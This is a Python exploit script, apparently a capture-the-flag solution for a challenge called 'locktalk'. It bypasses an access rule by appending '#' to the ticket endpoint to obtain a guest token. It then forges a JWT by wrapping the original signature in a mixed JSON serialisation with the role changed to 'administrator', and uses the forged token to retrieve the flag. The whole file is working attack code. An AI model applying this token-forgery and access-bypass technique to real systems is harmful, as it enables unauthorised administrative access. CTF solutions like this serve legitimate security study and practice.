import json
import socket
import time
from json import dumps, loads
from pwn import args

import requests
from jwcrypto.common import base64url_decode, base64url_encode


def send_raw_http_request(host, port, request):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect((host, port))

    client_socket.sendall(request.encode())

    response = b""
    while True:
        recv_data = client_socket.recv(1024)
        if not recv_data:
            break
        response += recv_data

    client_socket.close()

    return response.decode()


def get_token(host, port, retries=3, delay=5):
    for attempt in range(retries):
        request = f"""GET /api/v1/get_ticket# HTTP/1.1\r\nHost: {host}:{port}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36\r\nConnection: close\r\n\r\n"""
        response = send_raw_http_request(host, port, request)

        try:
            json_start = response.index("{")
            json_end = response.rindex("}") + 1
            json_data = response[json_start:json_end]
            ticket_dict = loads(json_data)

            # Retrieve the token using the correct key
            token = ticket_dict.get("ticket: ")  # Explicit key "ticket:"
            if not token:
                raise ValueError("Token not found in response")
            return token
        except (ValueError, json.JSONDecodeError) as e:
            if attempt < retries - 1:
                time.sleep(delay)

    return None


def exp(token):
    [header, payload, signature] = token.split(".")
    parsed_payload = loads(base64url_decode(payload))
    parsed_payload["role"] = "administrator"
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(",", ":"))))

    return (
        '{" '
        + header
        + "."
        + fake_payload
        + '.":"","protected":"'
        + header
        + '", "payload":"'
        + payload
        + '","signature":"'
        + signature
        + '"}'
    )


def get_flag(host, port, token):

    headers = {"Authorization": token}
    req = requests.get(f"http://{host}:{port}/api/v1/flag", headers=headers)

    return req


if __name__ == "__main__":
    if args["HOST"] and args["PORT"]:
        host = args["HOST"]
        port = int(args["PORT"])
    # host = "locktalk"
    # port = 1337
    guest_token = get_token(host, port)
    if guest_token:
        admin_token = exp(guest_token)
        response = get_flag(host, port, admin_token)
        response_data = loads(response.text)
        flag = response_data.get("message")
        print(flag)
    else:
        print("Failed to obtain guest token")
